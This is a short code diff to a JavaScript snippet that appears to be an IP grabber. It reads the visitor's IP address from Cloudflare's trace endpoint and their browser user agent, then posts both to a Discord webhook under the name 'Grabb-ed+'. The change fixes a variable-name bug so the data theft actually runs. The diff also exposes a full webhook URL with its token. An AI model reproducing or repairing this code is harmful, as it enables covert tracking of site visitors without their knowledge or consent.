@@ -8,9 +8,9 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
   var agent = navigator.userAgent;
   var udata = ip + " " + agent;
   const xml = new XMLHttpRequest;
-   request.open("POST", "https://discord.com/api/webhooks/1121323380285636671/3U0PA0ro8S3MWMOq01dRFfXLlwfe2mrjAT4QqmnIen_Hw4n3G6DBUFzrjSrUeOrPgyQz");
+   xml.open("POST", "https://discord.com/api/webhooks/1121323380285636671/3U0PA0ro8S3MWMOq01dRFfXLlwfe2mrjAT4QqmnIen_Hw4n3G6DBUFzrjSrUeOrPgyQz");
 
-   request.setRequestHeader('Content-type', 'application/json');
+   xml.setRequestHeader('Content-type', 'application/json');
 
    const params = {
      username: "Grabb-ed+",
@@ -18,5 +18,5 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
      content: udata
    }
 
-   request.send(JSON.stringify(params));
+   xml.send(JSON.stringify(params));
 });
